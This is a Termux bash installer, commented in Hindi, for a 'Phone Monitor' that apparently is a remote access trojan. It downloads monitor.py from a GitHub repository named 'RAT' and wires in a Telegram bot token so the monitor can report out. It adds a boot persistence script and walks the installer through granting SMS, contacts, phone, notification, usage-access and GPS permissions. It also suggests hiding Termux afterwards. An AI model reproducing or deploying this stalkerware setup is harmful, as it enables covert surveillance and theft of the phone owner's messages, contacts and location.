#!/data/data/com.termux/files/usr/bin/bash

echo "🔥 =============================================="
echo "      Phone Monitor - GitHub APK Setup"
echo "=============================================="

# 1. पैकेजेज़ अपडेट
echo "🟢 [1/8] पैकेजेज़ अपडेट..."
pkg update -y && pkg upgrade -y
pkg install python git screen termux-api termux-services -y
pip install requests

# 2. स्टोरेज परमिशन
echo "🟢 [2/8] स्टोरेज परमिशन..."
termux-setup-storage
sleep 2

# 3. monitor.py डाउनलोड
echo "🟢 [3/8] monitor.py डाउनलोड..."
curl -O https://raw.githubusercontent.com/vikramsengal/RAT/main/monitor.py

# 4. Token और Chat ID सेट करें
echo "🟢 [4/8] Token और Chat ID सेट करें..."
if [ -z "$BOT_TOKEN" ] || [ -z "$CHAT_ID" ]; then
    read -p "🔑 BOT_TOKEN (पेस्ट करें): " BOT_TOKEN
    read -p "🔑 CHAT_ID (पेस्ट करें): " CHAT_ID
    echo "export BOT_TOKEN='$BOT_TOKEN'" >> ~/.bashrc
    echo "export CHAT_ID='$CHAT_ID'" >> ~/.bashrc
    source ~/.bashrc
else
    echo "   Token और Chat ID पहले से सेट हैं।"
fi

# 5. 🔥 नया Auto-Start (बिना Termux:Boot के)
echo "🟢 [5/8] Auto-Start (Restart) सेटअप (बिना Termux:Boot)..."
mkdir -p ~/.termux/boot
cat > ~/.termux/boot/start_monitor.sh << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
source /data/data/com.termux/files/home/.bashrc
termux-wake-lock
sleep 15
screen -dmS monitor python /data/data/com.termux/files/home/monitor.py
EOF
chmod +x ~/.termux/boot/start_monitor.sh

# 6. बिना किसी अन्य ऐप के – सीधे Permissions स्क्रीन
echo "🟢 [6/8] Permissions स्क्रीन खोल रहा हूँ..."
sleep 2

am start -a android.settings.APPLICATION_DETAILS_SETTINGS -d package:com.termux >/dev/null 2>&1
echo "👉 [1/5] SMS, Phone, Contacts → ALLOW करें"
sleep 8

am start -a android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS >/dev/null 2>&1
echo "👉 [2/5] नोटिफिकेशन → Termux को ON करें"
sleep 8

am start -a android.settings.USAGE_ACCESS_SETTINGS >/dev/null 2>&1
echo "👉 [3/5] उपयोग ऐक्सेस → Termux को ON करें"
sleep 8

am start -a android.settings.IGNORE_BATTERY_OPTIMIZATION_SETTINGS >/dev/null 2>&1
echo "👉 [4/5] बैटरी → 'अनुकूलित न करें' चुनें"
sleep 8

am start -a android.settings.LOCATION_SOURCE_SETTINGS >/dev/null 2>&1
echo "👉 [5/5] लोकेशन → GPS ON करें"
sleep 5

# 7. Screen में मॉनिटर शुरू
echo "🟢 [7/8] मॉनिटरिंग बैकग्राउंड में शुरू..."
screen -dmS monitor python /data/data/com.termux/files/home/monitor.py

# 8. हो गया!
echo "🟢 [8/8] ✅ सब कुछ सेट है!"
echo "==========================================================="
echo "📩 30 सेकंड में Telegram पर पहला मैसेज आएगा।"
echo "🤖 /help भेजकर सारे कमांड देखें।"
echo "🔄 Restart के 30 सेकंड बाद मॉनिटरिंग अपने आप चालू हो जाएगी।"
echo "🔒 Termux और Termux:API को छिपाना हो तो Hide Apps करें।"
echo "==========================================================="
